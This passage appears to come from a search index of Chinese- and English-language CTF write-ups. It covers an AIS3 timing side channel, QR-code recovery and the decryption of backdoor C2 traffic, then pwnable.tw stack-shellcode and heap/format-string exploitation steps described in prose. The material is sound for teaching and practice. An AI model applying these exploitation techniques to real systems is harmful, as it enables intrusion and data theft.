ms\uff0c\u9019\u500b\u554f\u984c\u6703\u589e\u52a0\u6aa2\u9a57\u7684\u96e3\u6613\u5ea6\u3002 \u70ba\u4e86\u89e3\u6c7a\u4e0a\u8ff0\u554f\u984c\uff0c\u5fc5\u9808\u4f7f\u7528\u4e00\u4e9b\u6280\u5de7\u4f86\u907f\u514d\u8aa4\u5224\uff0c\u9996\u5148\u662f\u8981\u78ba\u5b9a\u54ea\u500b\u7b54\u6848\u662f\u932f\u7684\uff0c\u7576\u4e0d\u65b7\u5f80\u4e0a\u589e\u52a0\u6642\uff0c\u5f97\u5230\u7684\u6578\u5b57\u5982\u679c\u6c92\u6709\u7e7c\u7e8c\u589e\u52a0\u5c31\u4ee3\u8868\u524d\u9762\u53ef\u80fd\u6709\u5b57\u5143\u731c\u932f\uff0c\u9019\u908a\u53ef\u4ee5\u5c07\u524d\u5e7e\u500b\u5b57\u7684\u5dee\u503c\u5e73\u5747\uff0c\u4e26\u8207\u73fe\u5728\u7684\u5dee\u503c\u505a\u6bd4\u8f03 (\u4f8b\u5982\u5224\u65b7\u73fe\u5728\u7684\u5dee\u503c\u662f\u5426\u5927\u65bc\u539f\u5dee\u503c\u7684\u4e00\u534a)\uff0c\u5982\u679c\u767c\u73fe\u662f\u932f\u7684\uff0c\u5c31\u5f80\u524d\u4e00\u500b\u5b57\u5143\u91cd\u627e\uff0c\u9664\u6b64\u4e4b\u5916\uff0c\u4e5f\u53ef\u4ee5\u5c07\u540c\u500b\u5b57\u4e32\u9001\u591a\u6b21\u4f86\u53d6\u5f97\u5e73\u5747\u503c\uff0c\u4f86\u6c42\u5f97\u6bd4\u8f03\u7a69\u5b9a\u7684\u7b54\u6848\u3002","title":"Solution"},{"location":"Writeups/2020/AIS3_pre-exam/#note_3","text":"\u9019\u984c\u539f\u672c\u7684\u8a2d\u8a08\u662f\u4f7f\u7528 cpu time \u4f86\u8a08\u7b97\uff0c\u4f46\u6bd4\u8cfd\u958b\u59cb\u5f8c\uff0c\u56e0\u70ba\u5f88\u591a\u4eba\u4e00\u8d77\u6e2c\uff0c\u5f97\u5230\u7684\u6642\u9593\u5176\u5be6\u4e0d\u592a\u7a69\u5b9a\uff0c\u56e0\u6b64\u6bd4\u8cfd\u958b\u59cb\u5f8c\u5e7e\u5c0f\u6642\u6211\u5c31\u5c07\u984c\u76ee\u56de\u50b3\u7684\u6642\u9593\u6539\u6210 time += 11 + random()%5 \u4e86\uff0c\u4f46\u8cfd\u4e2d\u8a31\u591a\u540c\u5b78\u4f9d\u7136\u8a8d\u70ba\u662f\u7cfb\u7d71\u4e0d\u7a69\u5b9a\u9020\u6210\u7684\uff0c\u4e26\u6c92\u6709\u767c\u73fe\u9019\u984c\u771f\u6b63\u7684\u8003\u9ede\u4e26\u52a0\u4ee5\u6539\u5584\uff0c\u6709\u9ede\u53ef\u60dcQQ\u3002","title":"Note"},{"location":"Writeups/2020/AIS3_pre-exam/#soy","text":"","title":"\ud83d\udc7b Soy"},{"location":"Writeups/2020/AIS3_pre-exam/#description_4","text":"Here is your flag. Oops, my bad.","title":"Description"},{"location":"Writeups/2020/AIS3_pre-exam/#solution_4","text":"\u9019\u984c\u53ef\u4ee5\u53c3\u8003\u82f1\u6587\u7248 Wiki \uff0c\u5728\u984c\u76ee\u7684 QRcode \u4e2d\uff0c\u88ab\u906e\u4f4f\u7684\u90e8\u5206\u662f\u5bb9\u932f\u5340\u584a\uff0c\u683c\u5f0f\u5340\u584a\u4ee5\u53ca\u8cc7\u6599\u5340\u584a\u90fd\u662f\u6b63\u5e38\u7684\uff0c\u5982\u679c\u4e0d\u7ba1\u5bb9\u932f\u7684\u8a71\uff0c\u88e1\u9762\u5b58\u7684\u8cc7\u6599\u662f\u53ef\u4ee5\u6b63\u78ba\u5730\u89e3\u958b\u7684\uff0c\u800c\u5e73\u5e38\u4f7f\u7528\u7684\u89e3\u78bc\u7a0b\u5f0f\u90fd\u6703\u8003\u616e\u5bb9\u932f\u7684\u90e8\u5206\uff0c\u56e0\u6b64\u4e0d\u6703\u8f38\u51fa\u5132\u5b58\u7684\u8cc7\u6599\u3002\u9019\u984c\u53ef\u4ee5\u4f7f\u7528 \u7dda\u4e0a\u5de5\u5177 \u6216\u662f\u8ddf\u8457\u683c\u5f0f\u624b\u89e3\uff0c\u89e3\u7b54\u8acb\u53c3\u8003\u4e0b\u5716\uff1a","title":"Solution"},{"location":"Writeups/2020/AIS3_pre-exam/#note_4","text":"\u9019\u984c\u662f\u60f3\u8003 QRcode \u7684\u683c\u5f0f\u7684\uff0c\u53ea\u8981\u770b\u61c2 QRcode \u7684\u8a2d\u8a08\u5c31\u53ef\u4ee5\u9806\u5229\u89e3\u51fa\u4f86\uff0c\u7576\u6642\u6c92\u767c\u73fe\u6709\u7dda\u4e0a\u5de5\u5177\u53ef\u4ee5\u7528\uff0c\u4e5f\u6c92\u767c\u73fe HSCTF 2020 N-95 \u624d\u525b\u51fa\u904e\u985e\u4f3c\u7684\u984c\u76ee\uff0c\u7d50\u679c\u5c31\u88ab\u77ac\u9593\u89e3\u51fa\u4f86\u4e86QQ","title":"Note"},{"location":"Writeups/2020/AIS3_pre-exam/#clara","text":"","title":"\ud83e\uddf8 Clara"},{"location":"Writeups/2020/AIS3_pre-exam/#description_5","text":"I did nothing special today. >_<","title":"Description"},{"location":"Writeups/2020/AIS3_pre-exam/#solution_5","text":"\u9019\u984c\u7d66\u4e86\u4e00\u5305 100 mb \u7684 pcap\uff0c\u5148\u5206\u6790\u4e00\u4e0b\u50b3\u8f38\u7684\u7a2e\u985e (wireshark \u5728 statics -> conversations -> tcp)\uff0c\u53ef\u4ee5\u767c\u73fe\u6709\u5169\u7b46\u672c\u6a5f\u8ddf 140.112.42.47 \u7684\u50b3\u8f38\u91cf\u7279\u5225\u5927\uff0c\u4e14\u9019\u5169\u7b46\u662f\u552f\u4e00\u672a\u52a0\u5bc6\u7684 (\u53ef\u4ee5\u7528 http \u904e\u6ffe\u51fa\u4f86)\u3002 follow \u5176\u4e2d\u4e00\u7b46\uff0c\u53ef\u4ee5\u770b\u5230\u50b3\u905e\u8cc7\u6599\u5982\u4e0b\u5716\uff0c\u6bd4\u8f03\u4e00\u4e0b\u9019\u5169\u7b46\u53ef\u4ee5\u767c\u73fe\uff0c\u958b\u982d\u90fd\u662f\u50b3 deadbeeffaceb00c \uff0c\u5f8c\u9762\u624d\u4e0d\u4e00\u6a23\uff0c\u524d 8 bytes \u5be6\u969b\u4e0a\u662f\u5728\u505a key exchange\uff0c\u800c key \u7684\u9577\u5ea6\u662f 8 bytes\uff0c\u9060\u7aef\u6703\u5c07 key XOR deadbeeffaceb00c \uff0c\u672c\u5730\u7aef\u6536\u5230\u5f8c\u518d\u89e3\u5bc6\u5f97\u5230 key\uff0c\u63a5\u8457\u5f8c\u9762\u7684\u50b3\u8f38\u90fd\u662f\u7d93\u7531\u8a72 key \u505a XOR \u5f8c\u50b3\u8f38\u7684\u3002 \u5176\u5be6\u7ffb\u5230\u5f8c\u9762\u53ef\u4ee5\u767c\u73fe\u6709\u4e9b\u5340\u6bb5\u662f\u53ef\u4ee5\u770b\u5230\u5305\u542b AIS3{NO} \u548c xSECRETx \u7684\u5b57\u4e32\uff0c\u9019\u5206\u5225\u662f\u5169\u6b21\u6240\u4f7f\u7528\u7684 key\uff0c\u56e0\u70ba\u50b3\u905e\u7684\u8cc7\u6599\u4e2d\u5305\u542b 0x00 \uff0c\u6240\u4ee5\u7d93\u904e XOR \u5f8c\u53ef\u4ee5\u76f4\u63a5\u770b\u5230\u539f\u672c\u7684 key\uff0c\u5373\u4fbf\u6c92\u6709\u767c\u73fe\u524d\u9762\u662f key exchange\uff0c\u4e00\u6a23\u53ef\u4ee5\u5f9e\u9019\u908a\u63a8\u6572\u51fa\u52a0\u5bc6\u65b9\u5f0f\u4ee5\u53ca key\u3002 \u63a5\u8457\u8981\u89e3\u5bc6\u6240\u50b3\u8f38\u7684\u8cc7\u6599\uff0c\u89c0\u5bdf\u4e00\u4e0b\u683c\u5f0f\u53ef\u4ee5\u767c\u73fe\u5f8c\u9762\u7684\u8cc7\u6599\u90fd\u662f\u7531 4 bytes + n bytes + 4 bytes + m bytes \u7d44\u6210\uff0c\u5176\u4e2d n \u90fd\u6bd4\u8f03\u5c0f\uff0c\u800c m \u90fd\u975e\u5e38\u5927\uff0c\u9019\u908a\u53ef\u4ee5\u731c\u6e2c m \u662f\u8cc7\u6599\u672c\u8eab\uff0c\u800c n \u5247\u662f\u8ddf\u8a72\u8cc7\u6599\u6709\u95dc\u7684 metadata\uff0c\u524d\u9762\u7684 4 bytes \u5247\u53ef\u80fd\u662f\u9577\u5ea6\u3002\u56e0\u70ba\u4e00\u822c\u5f8c\u9580\u900f\u904e socket \u5728\u50b3\u8f38\u6642\uff0c\u5fc5\u9808\u5148\u6e9d\u901a\u597d\u683c\u5f0f\uff0cC2 Server \u624d\u80fd\u9806\u5229\u89e3\u8b80 backdoor \u50b3\u904e\u4f86\u7684\u8a0a\u606f\uff0c\u5c24\u5176\u662f\u5728\u50b3\u9001\u6a94\u6848\u9019\u7a2e\u4e0d\u56fa\u5b9a\u5927\u5c0f\u7684\u8cc7\u6599\uff0c\u4e00\u5b9a\u8981\u5148\u8b1b\u597d\u9577\u5ea6\u6216\u662f\u524d\u5f8c\u7db4\u3002 \u7d93\u904e\u89e3\u5bc6\u5f8c\u53ef\u4ee5\u767c\u73fe\uff0c4 bytes \u70ba Little Endian \u8868\u793a\u7684\u9577\u5ea6 (n / m)\uff0c\u5f8c\u9762 n / m bytes \u5247\u5206\u5225\u662f\u6a94\u540d\u4ee5\u53ca\u6a94\u6848\u5167\u5bb9\uff0c\u5176\u4e2d\u7b2c\u4e8c\u6b21\u5c0d\u8a71\u7684\u7b2c\u56db\u5f35\u5716\u7247\u5373\u70ba Flag\u3002","title":"Solution"},{"location":"Writeups/2020/AIS3_pre-exam/#note_5","text":"\u6211\u6700\u8fd1\u7684\u7814\u7a76\u9805\u76ee\u662f\u4ee5\u55ae\u7d14\u5229\u7528 monitor \u9304\u5230\u7684\u8cc7\u8a0a\uff0c\u4e14\u76e1\u91cf\u907f\u514d\u76f4\u63a5\u5206\u6790 binary \u7684\u65b9\u5f0f\u4f86\u5206\u6790 malware\uff0c\u6240\u4ee5\u60f3\u8a66\u8457\u628a\u5404\u7a2e\u7dda\u7d22\u532f\u96c6\u5728\u4e00\u8d77\u51fa\u6210\u984c\u76ee\uff0c\u6211\u6700\u5f8c\u63a1\u7528\u4e86 pcap \u7684\u65b9\u5f0f\uff0c\u56e0\u70ba\u6bd4\u8f03\u597d\u5206\u6790\uff0c\u5c0d\u65b0\u624b\u4e5f\u6bd4\u8f03\u5bb9\u6613\u4e0a\u624b\u3002\u56e0\u70ba\u53ea\u6709 pcap\uff0c\u6240\u4ee5\u5fc5\u9808\u7d66\u8db3\u7dda\u7d22\uff0c\u6211\u9078\u64c7\u900f\u904e http \u7684\u65b9\u5f0f\u50b3\u905e\u6578\u5f35\u5927\u578b\u5716\u7247\uff0c\u5982\u679c\u6709\u4ed4\u7d30\u5206\u6790\u904e\u5167\u5bb9\u7684\u8a71\uff0c\u61c9\u8a72\u662f\u53ef\u4ee5\u5f88\u5feb\u627e\u5230\u53ef\u7591\u7684\u6d41\u91cf\u3002 \u63a5\u8457\u662f\u52a0\u5bc6\u7684\u90e8\u5206\uff0c\u76f4\u63a5\u770b\u7684\u8a71\u662f\u770b\u4e0d\u51fa\u5230\u5e95\u5728\u50b3\u4ec0\u9ebc\uff0c\u56e0\u6b64\u53ef\u4ee5\u77e5\u9053\u662f\u6709\u52a0\u5bc6\u904e\u7684\uff0c\u554f\u984c\u662f\u7528\u4ec0\u9ebc\u65b9\u5f0f\u4ee5\u53ca\u4ec0\u9ebc key \u52a0\u5bc6\uff0c\u5982\u679c\u662f\u76f4\u63a5\u4f7f\u7528\u8a2d\u8a08\u6642\u5c31\u5beb\u597d\u7684 key \u52a0\u5bc6\u7684\u8a71\uff0c\u6211\u89ba\u5f97\u9019\u984c\u5c31\u592a\u901a\u9748\u4e86\uff0c\u56e0\u6b64\u6211\u7528\u4e86\u6bd4\u8f03\u7c21\u55ae\u6613\u61c2\u7684\u65b9\u5f0f\u4f86\u505a key exchange\uff0c\u70ba\u4e86\u907f\u514d\u53c3\u8cfd\u8005\u6c92\u6709\u767c\u73fe\uff0c\u6211\u6545\u610f\u5c07 backdoor \u65b7\u7dda\u4e26\u91cd\u65b0\u9023\u7dda\uff0c\u4e14\u5169\u6b21\u4f7f\u7528\u4e0d\u540c\u7684 key \u4f86\u52a0\u5bc6\uff0c\u900f\u904e\u89c0\u5bdf\u521d\u59cb\u7684 deadbeeffaceb00c \u61c9\u8a72\u5c31\u53ef\u4ee5\u63a8\u6572\u51fa\u4f86\u4e86 (\u5176\u4e2d\u4e00\u4f4d\u89e3\u958b\u7684\u540c\u5b78\u4e5f\u78ba\u5be6\u662f\u9019\u9ebc\u505a\u7684)\u3002\u53e6\u5916 key \u7684\u9577\u5ea6\u8a2d\u5b9a\u70ba 8 bytes \u4e5f\u662f\u4e00\u500b\u7dda\u7d22\uff0c\u56e0\u70ba\u5716\u7247\u6703\u6709\u8a31\u591a 0x00 \u6240\u4ee5\u52a0\u5bc6\u5f8c\u53ef\u4ee5\u76f4\u63a5\u770b\u5230 key \u7684\u5167\u5bb9\uff0c\u5c07 wireshark \u5207\u5230 hex mode \u4ee5\u5f8c\uff0c\u5b83\u662f\u4ee5\u6bcf 16 bytes \u505a\u5c0d\u9f4a\u7684\uff0c\u4ed4\u7d30\u89c0\u5bdf\u5c31\u53ef\u4ee5\u767c\u73fe\u540c\u4e00\u5217\u6703\u51fa\u73fe\u591a\u500b\u540c\u6a23\u5b57\u5143\uff0c\u5168\u90e8\u5f59\u96c6\u8d77\u4f86\u5f8c\u5c31\u662f\u8a72\u6b21\u7684 key \u4e86\u3002 \u6700\u5f8c\u662f\u50b3\u8f38\u5167\u5bb9\u7684\u90e8\u5206\uff0c\u5728\u900f\u904e socket \u50b3\u8f38\u6642\uff0c\u56e0\u70ba\u4e0d\u77e5\u9053\u5c0d\u65b9\u8981\u50b3\u4ec0\u9ebc\u5167\u5bb9\uff0c\u6240\u4ee5\u5fc5\u9808\u5148\u8a02\u597d\u4e00\u4e9b\u50b3\u8f38\u7684\u898f\u5247\uff0c\u5426\u5247\u5c0d\u65b9\u6536\u5230\u7684\u5c31\u53ea\u662f\u4e00\u5927\u7247\u7684\u8cc7\u6599\u800c\u5df2\uff0c\u5b8c\u5168\u4e0d\u77e5\u9053\u600e\u9ebc\u5207\u5272\u3002\u4e00\u822c\u4f86\u8aaa\u6703\u5206\u6210\u5169\u7a2e\uff0c\u7b2c\u4e00\u7a2e\u662f\u65e2\u5b9a\u7684\u683c\u5f0f\uff0c\u6700\u524d\u9762\u7684 key exchange \u5c31\u5c6c\u65bc\u9019\u7a2e\uff0c\u4e8b\u5148\u5c31\u8b1b\u597d backdoor \u50b3 8 bytes\uff0c\u800c C2 \u56de 8 bytes\uff0c\u7b2c\u4e8c\u7a2e\u5247\u662f\u4e0d\u56fa\u5b9a\u9577\u5ea6\u7684\uff0c\u5e38\u6703\u7528\u5728\u50b3\u6a94\u6848\u6216\u5b57\u4e32\u7684\u6642\u5019\uff0c\u53ef\u4ee5\u50cf\u9019\u984c\u4e00\u6a23\uff0c\u5148\u50b3\u4e00\u500b\u56fa\u5b9a\u9577\u5ea6 (\u9019\u984c\u70ba 4 bytes) \u8868\u793a\u9577\u5ea6\uff0c\u63a5\u8457\u5c31\u53ea\u8981\u63a5\u6536\u8a72\u9577\u5ea6\u7684\u8cc7\u6599\u5373\u53ef\uff0c\u4e5f\u53ef\u4ee5\u900f\u904e\u7279\u6b8a\u524d\u5f8c\u7db4\uff0c\u4f8b\u5982 <BEGIN>...<END> \u4f86\u6a19\u793a\u51fa\u8cc7\u6599\u7684\u7bc4\u570d\u3002 \u7d9c\u5408\u4ee5\u4e0a\u5e7e\u500b\u6982\u5ff5\uff0c\u5c31\u53ef\u4ee5\u9806\u5229\u7684\u89e3\u958b\u9019\u984c\u4e86\uff0c\u4e0d\u904e\u4e00\u76f4\u5230\u6700\u5f8c\u6211\u4e1f\u51fa\u4e00\u5806\u63d0\u793a\u624d\u6709\u4eba\u89e3\u958bQQ\uff0c\u6211\u89ba\u5f97\u53ef\u80fd\u662f\u56e0\u70ba\u540c\u5b78\u5c0d backdoor \u7814\u7a76\u8f03\u5c11\uff0c\u56e0\u6b64\u5c0d\u8a31\u591a\u7dda\u7d22\u6bd4\u8f03\u4e0d\u654f\u611f\u3002\u5176\u5be6\u9019\u984c\u6211\u5728\u51fa\u5b8c\u5f8c\u9084\u6709\u62ff\u7d66\u5728 Forensic \u65b9\u9762\u6709\u7814\u7a76\u7684\u524d\u8f29\u770b\u770b\uff0c\u6211\u5011\u89ba\u5f97\u7dda\u7d22\u7d66\u7684\u5920\u591a\uff0c\u61c9\u8a72\u662f\u4e0d\u6703\u592a\u901a\u9748\uff0c\u4ed6\u6709\u5efa\u8b70\u6211\u4e00\u4e9b\u964d\u4f4e\u96e3\u5ea6\u7684\u65b9\u6cd5\uff0c\u4f8b\u5982\u53ef\u4ee5\u76f4\u63a5\u5728\u6d41\u91cf\u4e2d\u50b3\u905e\u6574\u500b backdoor\uff0c\u4e4b\u5f8c\u518d\u900f\u904e backdoor \u505a\u4e4b\u5f8c\u7684\u50b3\u8f38\uff0c\u4e0d\u904e\u89ba\u5f97\u9019\u6a23\u5c31\u8b8a\u6210\u55ae\u7d14\u7684 dump binary \u7136\u5f8c reverse \u4e86\uff0c\u6709\u9ede\u7121\u8da3\uff0c\u6240\u4ee5\u624d\u4fdd\u7559\u4e86\u539f\u59cb\u7684\u4f5c\u6cd5\u3002","title":"Note"},{"location":"Writeups/Others/pwnable.tw/Start/","text":"Start Challenge link: Start Categoty: pwn Writeup: Start Just a start. nc chall.pwnable.tw 10000 start nc Let's start the CTF:{input} Observation Read length can read 0x3c bytes Buf store on stack and stack excutable Ret Payload = 20 bytes Solution Leak stack address If we want to execute code on stack, we should return $PC to stack at first. However, stack address is not always the same. Thus, we should leak stack address in the beginning. Target There is an address ( 0xffffd220 ) after return address. $esp will be 0xffffd21c ( \u2192 0xffffd220 ) after return, then we can use write to print this address. Return Return to mov ecx, esp before write to mov buffer to the target. Shellcode After leaking address, we get another chance to write. Buffer is $esp (still on the stack). Target I found that return address on the stack is 0x%%%%%%T0 - % from the address leaked in advance - T is a random number from 0 to f Therefore, just put 0x%%%%%%T4 at return address. Then write shellcode after it. Which number is T ? There are 16 possible numbers, so just guess !!! You will get shell if you are fortunate enough. OwO","title":"Start"},{"location":"Writeups/Others/pwnable.tw/Start/#start","text":"Challenge link: Start Categoty: pwn Writeup: Start Just a start. nc chall.pwnable.tw 10000 start","title":"Start"},{"location":"Writeups/Others/pwnable.tw/Start/#nc","text":"Let's start the CTF:{input}","title":"nc"},{"location":"Writeups/Others/pwnable.tw/Start/#observation","text":"","title":"Observation"},{"location":"Writeups/Others/pwnable.tw/Start/#read-length","text":"can read 0x3c bytes","title":"Read length"},{"location":"Writeups/Others/pwnable.tw/Start/#buf","text":"store on stack and stack excutable","title":"Buf"},{"location":"Writeups/Others/pwnable.tw/Start/#ret","text":"Payload = 20 bytes","title":"Ret"},{"location":"Writeups/Others/pwnable.tw/Start/#solution","text":"","title":"Solution"},{"location":"Writeups/Others/pwnable.tw/Start/#leak-stack-address","text":"If we want to execute code on stack, we should return $PC to stack at first. However, stack address is not always the same. Thus, we should leak stack address in the beginning.","title":"Leak stack address"},{"location":"Writeups/Others/pwnable.tw/Start/#target","text":"There is an address ( 0xffffd220 ) after return address. $esp will be 0xffffd21c ( \u2192 0xffffd220 ) after return, then we can use write to print this address.","title":"Target"},{"location":"Writeups/Others/pwnable.tw/Start/#return","text":"Return to mov ecx, esp before write to mov buffer to the target.","title":"Return"},{"location":"Writeups/Others/pwnable.tw/Start/#shellcode","text":"After leaking address, we get another chance to write. Buffer is $esp (still on the stack).","title":"Shellcode"},{"location":"Writeups/Others/pwnable.tw/Start/#target_1","text":"I found that return address on the stack is 0x%%%%%%T0 - % from the address leaked in advance - T is a random number from 0 to f Therefore, just put 0x%%%%%%T4 at return address. Then write shellcode after it.","title":"Target"},{"location":"Writeups/Others/pwnable.tw/Start/#which-number-is-t","text":"There are 16 possible numbers, so just guess !!! You will get shell if you are fortunate enough. OwO","title":"Which number is T ?"},{"location":"Writeups/Others/pwnable.tw/criticalheap/","text":"criticalheap Challenge link: criticalheap Category: pwn Writeup: criticalheap There are some secrets . Try to capture /home/critical_heap++/flag . We recommend you to use the provided docker environment to develop your exploit: nc chall.pwnable.tw 10500 critical_heap.tar.gz Observation \u9019\u984c\u6709\u5f88\u591a\u500b\u9078\u9805\u53ef\u4ee5\u4f7f\u7528\uff0c\u4ee5\u4e0b\u8b1b\u53ef\u80fd\u6703\u7528\u5230\u7684\u90e8\u5206 struct \u9019\u984c\u6709\u4e09\u500b struct (normal, time, system) \u5728\u4e00\u500b union\uff0c\u4e00\u958b\u59cb\u5c31\u5148\u5728 .bss \u6bb5\u5ba3\u544a\u9577\u5ea6 10 \u7684 struct \u9663\u5217\uff0c\u5176\u4e2d\u67d0\u4e9b\u8b8a\u6578 (name, value...) \u662f\u5b58\u5b57\u4e32\u7684\u6307\u6a19 normal 00000000 name ... 00000018 content ... system 00000000 name ... 00000020 value ... create name name \u7684\u90e8\u5206\u662f\u5148 read \u9032\u4f86\u4ee5\u5f8c\uff0c\u7528 strdup \u653e\u5230 struct \u4e0a\u7684\uff0c\u6240\u4ee5\u4e5f\u662f\u5b58\u5728 heap \u4e0a normal normal \u7684\u90e8\u5206\u9700\u8981\u8f38\u5165 content\uff0c\u5b83\u662f\u76f4\u63a5 read \u5230 rax + 0x18 (struct \u4e0a\u7684 0x18) \u7684\u4f4d\u7f6e\uff0c\u6c92\u6709\u5728\u5f8c\u9762\u88dc\u4e0a 0x00 time time \u6703\u7528 localtime \u62ff\u53d6\u73fe\u5728\u7684\u6642\u9593\u4ee5\u5f8c\uff0c\u8655\u7406\u5b8c\u5b58\u9032 struct localtime \u5148\u4f7f\u7528 getenv \u6293\u53d6\u74b0\u5883\u8b8a\u6578 TZ \u7684\u503c\uff0c\u63a5\u8457\u8b80\u51fa TZ \u6240\u6307\u7684\u6a94\u6848\uff0c\u4e26\u5c07\u5167\u5bb9\u5b58\u5728 heap \u4e0a play_system Set the name for the heap \u9019\u500b\u529f\u80fd\u5176\u5be6\u5c31\u662f setenv Unset the name in the heap \u9019\u500b\u529f\u80fd\u662f unsetenv Get the value of name \u9019\u500b\u529f\u80fd\u6bd4\u8f03\u7279\u5225\uff0c\u6703\u5148\u7528 getenv \u6293\u8f38\u5165\u7684 name\uff0c\u63a5\u8457\u5c07\u6293\u5230\u7684\u6307\u6a19 (\u6307\u5411 heap \u4e0a\u5b58 value \u8655) \u5b58\u5728 rax + 0x20 (struct \u4e0a 0x20 \u7684\u4f4d\u7f6e) play_normal Show the content of heap \u9019\u500b\u529f\u80fd\u6709 format string \u7684\u6f0f\u6d1e\uff0c\u800c\u4e14\u662f\u4f7f\u7528 printf_chk delete delete \u5be6\u969b\u4e0a\u53ea\u6709\u628a\u6307\u5b9a\u7684 struct \u6a19\u6210 0 \u800c\u5df2\uff0c\u4e0a\u9762\u7684\u8cc7\u8a0a\u4e26\u6c92\u6709\u6e05\u7a7a Conclusion create_normal \u8b80\u53d6 content \u6642\u6c92\u6709\u7d50\u5c3e play_normal \u6709 format string \u7684\u6f0f\u6d1e setenv \u53ef\u4ee5\u6539\u52d5 TZ \u7684\u503c delete \u6c92\u6709\u6e05\u7a7a Solution \u89e3\u6cd5\u6b65\u9a5f\u5982\u4e0b\uff1a leak heap base \u4f4d\u7f6e \u5229\u7528 setenv \u6539\u52d5 TZ \u4ee5\u5f8c\uff0c\u7528 localtime \u5c07 flag \u8b80\u5230 heap \u4e0a \u5229\u7528 format string \u5370\u51fa flag leak heap base \u9019\u500b\u90e8\u5206\u8981\u5229\u7528 \"delete \u6c92\u6709\u6e05\u7a7a\" \u7684\u6f0f\u6d1e \u5148\u5275 system\uff0c\u63a5\u8457\u5230 play \u96a8\u4fbf\u5275\u4e00\u500b\u74b0\u5883\u8b8a\u6578\uff0c\u518d\u4f7f\u7528 play_system_get_value \u4f86\u5c07\u74b0\u5883\u8b8a\u6578\u7684\u4f4d\u5740\u653e\u5230 struct \u4e0a\uff0c\u9019\u662f\u70ba\u4e86\u53d6\u5f97\u4e00\u6bb5 heap address 0x000 name 0x020 value (heap address) \u63a5\u8457 delete \u6389\uff0c\u7136\u5f8c\u5275\u4e00\u500b normal \u7684 struct\uff0c\u6b64\u6642 normal struct \u6703\u84cb\u5728 system struct \u539f\u672c\u7684\u4f4d\u7f6e\u4e0a \u56e0\u70ba content \u5b58\u5728 0x18\uff0c\u8207\u539f\u672c\u7684 value \u5dee 0x8\uff0c\u8981\u8f38\u5165 8 \u500b\u5b57\u5143\u624d\u80fd\u78b0\u5230 value \u7684\u4f4d\u7f6e \u4e0d\u8981\u8f38\u5165 \\n \u4e0d\u7136\u8f38\u51fa\u6703\u88ab\u622a\u65b7 0x000 name 0x018 content ('AAAAAAAA') 0x020 value (heap address) \u6700\u5f8c\u5c31\u4f7f\u7528 show \u628a struct \u5370\u51fa\u4f86\u5c31\u53ef\u4ee5\u5f97\u5230 heap address \u4e86 \u56e0\u70ba\u5728 heap \u4e0a\u76f8\u5c0d\u4f4d\u7f6e\u4e0d\u8b8a\uff0c\u7528 gdb \u770b\u4e00\u4e0b\u8ddf base \u5dee\u591a\u9060\uff0cleak \u51fa\u4f86\u5f8c\u6e1b\u6389\u5c31\u662f heap base \u4e86 TZ \u9019\u500b\u90e8\u5206\u5c31\u5275\u4e00\u500b system \u7136\u5f8c\u7528 setenv \u628a TZ \u8a2d\u6210 /home/critical_heap++/flag \u63a5\u8457\u5275\u4e00\u500b time struct\uff0c\u5c31\u6703\u5728 localtime \u5c07 flag \u8b80\u53d6\u5230 heap \u4e0a\u4e86\uff0c\u7136\u5f8c\u7528 gdb \u770b\u4e00\u4e0b offset \u642d\u914d heap base \u5c31\u53ef\u4ee5\u77e5\u9053 flag address \u4e86 format string \u5229\u7528 format string \u642d\u914d %s \u53ef\u4ee5 leak \u4efb\u610f\u4f4d\u5740\u7684\u7279\u6027\u4f86 leak flag address \u53e6\u5916\uff0c\u56e0\u70ba\u662f\u4f7f\u7528 printf_chk \u7684\u95dc\u4fc2\uff0c\u4e0d\u80fd\u4f7f\u7528 $ \u8981\u81ea\u5df1\u7528 %c \u4f86\u8df3\u5230\u6307\u5b9a\u5340\u57df Note peda in docker \u9019\u6b21\u6709\u7d66\u4e00\u500b docker \u7684\u74b0\u5883\uff0c\u8981\u5728\u88e1\u9762\u4f7f\u7528 gdb-peda \u7684\u8a71\uff0c\u8981\u6539\u52d5\u4ee5\u4e0b\u8a2d\u5b9a Dockerfile RUN apt-get install gdb git -y WORKDIR /root RUN git clone https://github.com/scwuaptx/Pwngdb.git ; cp ~/Pwngdb/.gdbinit ~/ RUN git clone https://github.com/scwuaptx/peda.git ~/peda ; echo \"source ~/peda/peda.py\" >> ~/.gdbinit ; cp ~/peda/.inputrc ~/ docker-compose.yml critical_heap : cap_add : - SYS_PTRACE","title":"criticalheap"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#criticalheap","text":"Challenge link: criticalheap Category: pwn Writeup: criticalheap There are some secrets . Try to capture /home/critical_heap++/flag . We recommend you to use the provided docker environment to develop your exploit: nc chall.pwnable.tw 10500 critical_heap.tar.gz","title":"criticalheap"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#observation","text":"\u9019\u984c\u6709\u5f88\u591a\u500b\u9078\u9805\u53ef\u4ee5\u4f7f\u7528\uff0c\u4ee5\u4e0b\u8b1b\u53ef\u80fd\u6703\u7528\u5230\u7684\u90e8\u5206","title":"Observation"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#struct","text":"\u9019\u984c\u6709\u4e09\u500b struct (normal, time, system) \u5728\u4e00\u500b union\uff0c\u4e00\u958b\u59cb\u5c31\u5148\u5728 .bss \u6bb5\u5ba3\u544a\u9577\u5ea6 10 \u7684 struct \u9663\u5217\uff0c\u5176\u4e2d\u67d0\u4e9b\u8b8a\u6578 (name, value...) \u662f\u5b58\u5b57\u4e32\u7684\u6307\u6a19","title":"struct"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#normal","text":"00000000 name ... 00000018 content ...","title":"normal"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#system","text":"00000000 name ... 00000020 value ...","title":"system"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#create","text":"","title":"create"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#name","text":"name \u7684\u90e8\u5206\u662f\u5148 read \u9032\u4f86\u4ee5\u5f8c\uff0c\u7528 strdup \u653e\u5230 struct \u4e0a\u7684\uff0c\u6240\u4ee5\u4e5f\u662f\u5b58\u5728 heap \u4e0a","title":"name"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#normal_1","text":"normal \u7684\u90e8\u5206\u9700\u8981\u8f38\u5165 content\uff0c\u5b83\u662f\u76f4\u63a5 read \u5230 rax + 0x18 (struct \u4e0a\u7684 0x18) \u7684\u4f4d\u7f6e\uff0c\u6c92\u6709\u5728\u5f8c\u9762\u88dc\u4e0a 0x00","title":"normal"},{"location":"Writeups/Others/pwnable.tw/criticalheap/#time","text":"time \u6703\u7528 localtime \u62ff\u53d6\u73fe\u5728\u7684\u6642\u9593\u4ee5\u5f8c\uff0c\u8655\u7406\u5b8c\u5b58\u9032 struct 